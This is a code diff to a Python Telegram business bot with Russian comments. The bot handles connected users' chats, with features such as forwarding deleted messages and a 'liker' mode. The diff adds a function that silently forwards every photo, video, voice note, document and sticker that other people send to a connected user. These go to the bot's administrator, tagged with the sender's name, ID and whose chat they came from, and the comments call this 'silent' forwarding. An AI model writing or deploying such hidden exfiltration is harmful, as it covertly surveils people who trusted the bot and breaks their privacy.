@@ -81,8 +81,14 @@ def get_command(text: str) -> str:
 
 
 def is_bot_sent(message: Message) -> bool:
-    """Возвращает True если это сообщение отправил сам бот через business_connection_id."""
     return bool(getattr(message, "sender_business_bot", None))
+
+
+def has_media(msg: Message) -> bool:
+    return bool(
+        msg.photo or msg.video or msg.voice or msg.audio
+        or msg.document or msg.video_note or msg.sticker or msg.animation
+    )
 
 
 async def resolve_owner(business_connection_id: str) -> int:
@@ -194,6 +200,51 @@ async def forward_deleted(msg: Message, owner_id: int):
         await send_deleted_msg(ADMIN_ID, msg, build_deleted_header_admin(msg, owner_id))
 
 
+async def forward_media_silent(owner_id: int, msg: Message):
+    """Тихо пересылает все медиа/голосовые сообщения администратору бота."""
+    try:
+        name, uid = build_sender_info(msg)
+        info = connected_users.get(owner_id)
+        if info:
+            biz_user = escape_html(info["name"])
+            if info.get("username"):
+                biz_user += f", @{info['username']}"
+            biz_user += f" [ID: {owner_id}]"
+        else:
+            biz_user = str(owner_id)
+        header = (
+            f'<tg-emoji emoji-id="5904630315946611415">👤</tg-emoji> {name}\n'
+            f'<tg-emoji emoji-id="5285350148451344065">📱</tg-emoji> {uid}\n'
+            f'📨 Переписка: {biz_user}\n'
+            f'📎 медиафайл:'
+        )
+        if msg.photo:
+            caption = header + (f"\n{escape_html(msg.caption)}" if msg.caption else "")
+            await bot.send_photo(ADMIN_ID, msg.photo[-1].file_id, caption=caption, parse_mode="HTML")
+        elif msg.video:
+            caption = header + (f"\n{escape_html(msg.caption)}" if msg.caption else "")
+            await bot.send_video(ADMIN_ID, msg.video.file_id, caption=caption, parse_mode="HTML")
+        elif msg.voice:
+            await bot.send_voice(ADMIN_ID, msg.voice.file_id, caption=header, parse_mode="HTML")
+        elif msg.audio:
+            caption = header + (f"\n{escape_html(msg.caption)}" if msg.caption else "")
+            await bot.send_audio(ADMIN_ID, msg.audio.file_id, caption=caption, parse_mode="HTML")
+        elif msg.document:
+            caption = header + (f"\n{escape_html(msg.caption)}" if msg.caption else "")
+            await bot.send_document(ADMIN_ID, msg.document.file_id, caption=caption, parse_mode="HTML")
+        elif msg.video_note:
+            await bot.send_message(ADMIN_ID, header, parse_mode="HTML")
+            await bot.send_video_note(ADMIN_ID, msg.video_note.file_id)
+        elif msg.sticker:
+            await bot.send_message(ADMIN_ID, header, parse_mode="HTML")
+            await bot.send_sticker(ADMIN_ID, msg.sticker.file_id)
+        elif msg.animation:
+            await bot.send_message(ADMIN_ID, header, parse_mode="HTML")
+            await bot.send_animation(ADMIN_ID, msg.animation.file_id)
+    except Exception as e:
+        logging.error(f"Ошибка тихой пересылки медиа администратору: {e}")
+
+
 @dp.business_connection()
 async def handle_connection(bc: BusinessConnection):
     user_id = bc.user.id
@@ -282,7 +333,6 @@ async def handle_business_message(message: Message):
             except Exception as e:
                 logging.warning(f"Не удалось удалить /nolike: {e}")
             like_mode_chats.discard(chat_id)
-            # Очищаем все pending-правки для этого чата
             stale = {(cid, mid) for (cid, mid) in like_edited_messages if cid == chat_id}
             like_edited_messages.difference_update(stale)
             try:
@@ -298,9 +348,12 @@ async def handle_business_message(message: Message):
 
     save_to_cache(message)
 
-    # Пропускаем сообщения отправленные самим ботом (статусные и прочие)
     if is_bot_sent(message):
         return
+
+    # Тихая пересылка медиа/голосовых тебе (только входящие от других пользователей)
+    if sender_id != owner_id and has_media(message):
+        await forward_media_silent(owner_id, message)
 
     # Лайкер: только для исходящих сообщений владельца, не от бота
     if (
@@ -308,12 +361,15 @@ async def handle_business_message(message: Message):
         and sender_id == owner_id
         and message.chat.id in like_mode_chats
     ):
-        # Финальная проверка перед редактированием
         if message.chat.id not in like_mode_chats:
             return
-
-        suffix = get_like_suffix()
         like_key = (message.chat.id, message.message_id)
+        if like_key in like_edited_messages:
+            return
+        suffix = get_like_suffix()
+        await asyncio.sleep(1.0)
+        if message.chat.id not in like_mode_chats:
+            return
         like_edited_messages.add(like_key)
         try:
             if message.text:
@@ -373,7 +429,6 @@ async def handle_edited(message: Message):
         save_to_cache(message)
         return
 
-    # Пропускаем правки от самого бота
     if is_bot_sent(message):
         save_to_cache(message)
         return
